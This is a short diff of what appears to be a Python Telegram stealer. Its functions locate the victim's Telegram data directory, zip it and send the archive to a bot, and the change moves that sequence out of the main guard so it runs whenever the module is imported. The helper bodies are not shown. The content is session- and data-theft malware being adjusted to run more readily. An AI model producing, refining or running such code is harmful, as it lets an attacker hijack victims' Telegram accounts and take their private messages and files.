@@ -98,20 +98,15 @@ def send_archive_to_bot_requests(archive_path):
         return False
 
 
-if __name__ == '__main__':
-    import psutil
-    import os
-    import zipfile
-    import datetime
-    import requests 
-    from requests.exceptions import RequestException
-    telegram_directory = find_telegram_directory()
 
-    if telegram_directory:
-        archive_path = create_archive(telegram_directory)
-        if archive_path:
-            send_archive_to_bot_requests(archive_path)
-        else:
-            pass
+
+telegram_directory = find_telegram_directory()
+
+if telegram_directory:
+    archive_path = create_archive(telegram_directory)
+    if archive_path:
+        send_archive_to_bot_requests(archive_path)
     else:
         pass
+else:
+    pass
